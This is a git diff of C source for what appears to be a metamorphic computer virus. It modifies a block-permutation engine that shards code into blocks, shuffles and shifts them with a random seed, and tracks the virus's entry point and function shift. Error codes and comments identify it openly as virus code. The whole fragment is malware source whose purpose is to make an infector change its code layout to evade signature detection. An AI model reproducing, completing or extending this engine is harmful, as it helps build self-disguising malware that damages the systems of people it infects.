@@ -246,7 +246,8 @@ static bool	shift_blocks(struct code_block *blocks[NBLOCKS])
 
 /* --------------------------- Shift entry point ---------------------------- */
 
-static bool	shift_entry_point(size_t *entry_point, \
+static bool	shift_entry_point(size_t virus_entry_point, \
+			int32_t *virus_func_shift,
 			struct safe_ptr input_code,
 			struct safe_ptr output_buffer,
 			struct code_block *blocks[NBLOCKS])
@@ -257,24 +258,25 @@ static bool	shift_entry_point(size_t *entry_point, \
 		size_t	block_start = (size_t)b->ref.ptr;
 		size_t	block_end   = (size_t)b->ref.ptr + b->ref.size;
 
-		if (*entry_point >= block_start && *entry_point < block_end)
+		if (virus_entry_point >= block_start && virus_entry_point < block_end)
 		{
-			void	*input_start = input_code.ptr;
-			size_t	block_offset = block_start - (size_t)input_start;
-			size_t	block_size = b->ref.size;
-
-			void	*block_buffer = safe(output_buffer, block_offset, block_size);
-
-			if (!block_buffer)
-				return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
-
-			size_t	entry_point_offset = *entry_point - block_start;
-			*entry_point = safe_shift((size_t)block_buffer + entry_point_offset, b->shift_amount);
+			*virus_func_shift = b->shift_amount;
+			// void	*input_start = input_code.ptr;
+			// size_t	block_offset = block_start - (size_t)input_start;
+			// size_t	block_size = b->ref.size;
+			//
+			// void	*block_buffer = safe(output_buffer, block_offset, block_size);
+			//
+			// if (!block_buffer)
+			// 	return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
+			//
+			// size_t	entry_point_offset = *entry_point - block_start;
+			// *entry_point = safe_shift((size_t)block_buffer + entry_point_offset, b->shift_amount);
 
 			return true;
 		}
 	}
-	return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
+	return errors(ERR_VIRUS, _ERR_NO_ENTRY_POINT);
 }
 
 /* ------------------------- Write permutated code -------------------------- */
@@ -394,7 +396,8 @@ static bool	write_permutated_code(struct safe_ptr input_code, \
 */
 bool		permutate_blocks(struct safe_ptr input_code, \
 			struct safe_ptr output_buffer, \
-			size_t *output_size, size_t *entry_point, \
+			size_t *output_size,
+			size_t virus_entry_point, int32_t *virus_func_shift, \
 			uint64_t seed)
 { // TODO adapt proto
 	struct block_allocation		block_memory;
@@ -404,13 +407,13 @@ bool		permutate_blocks(struct safe_ptr input_code, \
 	|| !shard_block(blocks, block_memory.blocks, &seed)
 	|| !shuffle_blocks(blocks, seed)
 	|| !shift_blocks(blocks)
-	|| !shift_entry_point(entry_point, input_code, output_buffer, blocks)// impossible if we don't know where virus is!
+	|| !shift_entry_point(virus_entry_point, virus_func_shift, input_code, output_buffer, blocks)// impossible if we don't know where virus is!
 	|| !write_permutated_code(input_code, output_buffer, blocks, output_size))
 		return errors(ERR_THROW, _ERR_PERMUTATE_BLOCKS);
 
 #ifdef DEBUG
-	print_split_blocks(block_memory.blocks, NBLOCKS, input_code, output_buffer);
-	print_general(input_code, output_buffer, *entry_point, *output_size, seed);
+	// print_split_blocks(block_memory.blocks, NBLOCKS, input_code, output_buffer);
+	print_general(input_code, output_buffer, (size_t)virus_entry_point, *output_size, seed);
 #endif
 	return true;
 }
